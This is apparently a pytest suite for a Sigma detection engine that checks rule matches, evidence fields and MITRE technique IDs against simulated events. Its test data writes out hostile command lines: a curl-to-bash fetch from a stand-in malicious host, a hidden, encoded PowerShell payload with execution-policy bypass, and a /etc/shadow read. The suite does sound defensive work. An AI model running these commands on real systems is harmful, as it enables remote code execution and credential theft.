"""Tests for the Sigma detection engine."""

import pytest

from app.services.detection.sigma_engine import Match, SigmaEngine, SigmaEngineError


def test_office_spawns_shell_tp():
    engine = SigmaEngine()
    event = {
        "actor": {"process": {"file": {"path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}}},
        "process": {"file": {"path": "C:\\Windows\\System32\\cmd.exe"}, "cmd_line": "cmd.exe /c echo test"}
    }
    matches = engine.evaluate(event)
    assert len(matches) == 1
    match = matches[0]
    assert match.rule_title == "Office Spawns Shell"
    # Assert exact uppercase format
    assert match.technique_ids == ["T1566.001"]
    assert match.technique_ids[0] == "T1566.001"
    assert match.technique_ids[0].startswith("T")
    assert not match.technique_ids[0].startswith("t")
    assert match.evidence == {
        "actor.process.file.path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "process.file.path": "C:\\Windows\\System32\\cmd.exe"
    }


def test_powershell_encoded_command_tp():
    engine = SigmaEngine()
    event = {
        "process": {
            "file": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            "cmd_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
        }
    }
    matches = engine.evaluate(event)
    assert len(matches) == 1
    match = matches[0]
    assert match.rule_title == "PowerShell Encoded Command"
    # Assert exact uppercase format
    assert match.technique_ids == ["T1059.001"]
    assert match.technique_ids[0] == "T1059.001"
    assert match.technique_ids[0].startswith("T")
    assert not match.technique_ids[0].startswith("t")
    assert match.evidence == {
        "process.file.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.cmd_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
    }


def test_linux_shell_pipe_to_shell_tp():
    engine = SigmaEngine()
    event = {
        "process": {
            "cmd_line": "curl -s http://malicious.com/payload.sh | bash"
        }
    }
    matches = engine.evaluate(event)
    assert len(matches) == 1
    match = matches[0]
    assert match.rule_title == "Linux Shell Pipe to Shell"
    assert match.technique_ids == ["T1059.004"]
    assert match.evidence == {
        "process.cmd_line": "curl -s http://malicious.com/payload.sh | bash"
    }


def test_shadow_file_read_tp():
    engine = SigmaEngine()
    event = {
        "file": {"path": "/etc/shadow"},
        "process": {"file": {"path": "/bin/cat"}}
    }
    matches = engine.evaluate(event)
    assert len(matches) == 1
    match = matches[0]
    assert match.rule_title == "Shadow File Read"
    assert match.technique_ids == ["T1003.008"]
    assert match.evidence == {
        "file.path": "/etc/shadow"
    }


def test_shadow_file_read_filtered_legitimate_process():
    """Verify shadow_file_read does not match when accessed by legitimate filtered process (sshd)."""
    engine = SigmaEngine()
    event = {
        "file": {"path": "/etc/shadow"},
        "process": {"file": {"path": "/usr/sbin/sshd"}}
    }
    matches = engine.evaluate(event)
    assert len(matches) == 0


def test_shadow_file_read_filtered_via_auditd_parser():
    """Verify parse_file_watch output with sshd is correctly filtered by shadow_file_read rule."""
    from app.services.parsers.auditd_to_ocsf import parse_file_watch

    ev = parse_file_watch({
        "path": "/etc/shadow",
        "exe": "/usr/sbin/sshd",
        "user": "root",
        "time": "2026-01-15T02:00:00Z",
        "serial": "123",
    })
    engine = SigmaEngine()
    matches = engine.evaluate(ev)
    assert len(matches) == 0


def test_lsass_process_access_tp():
    engine = SigmaEngine()
    event = {
        "process": {"file": {"path": "C:\\Windows\\System32\\lsass.exe"}}
    }
    matches = engine.evaluate(event)
    assert len(matches) == 1
    match = matches[0]
    assert match.rule_title == "LSASS Process Access"
    assert match.technique_ids == ["T1003.001"]
    assert match.evidence == {
        "process.file.path": "C:\\Windows\\System32\\lsass.exe"
    }


def test_true_negative_benign_event():
    engine = SigmaEngine()
    event = {
        "actor": {"process": {"file": {"path": "C:\\Windows\\explorer.exe"}}},
        "process": {"file": {"path": "C:\\Windows\\System32\\notepad.exe"}, "cmd_line": "notepad.exe"}
    }
    matches = engine.evaluate(event)
    assert len(matches) == 0


def test_malformed_rule_raises_error(tmp_path):
    bad_rule = tmp_path / "bad.yml"
    bad_rule.write_text("title: Only Title No Rule\n", encoding="utf-8")
    with pytest.raises(SigmaEngineError, match="Failed to parse rule"):
        SigmaEngine(rules_dir=tmp_path)


def test_unsupported_numeric_field_fails_safely():
    """Assert numeric field comparison without string modifier raises clear typed error, not silent match/crash."""
    numeric_rule_yaml = """
title: Numeric Port Rule
id: 99999999-9999-9999-9999-999999999999
status: experimental
level: medium
author: project team
logsource:
  category: network_connection
detection:
  selection:
    DestinationPort: 4444
  condition: selection
"""
    engine = SigmaEngine(rule_yaml=numeric_rule_yaml)
    event = {"DestinationPort": 4444}
    with pytest.raises(SigmaEngineError, match="Unsupported Sigma value type 'SigmaNumber'"):
        engine.evaluate(event)
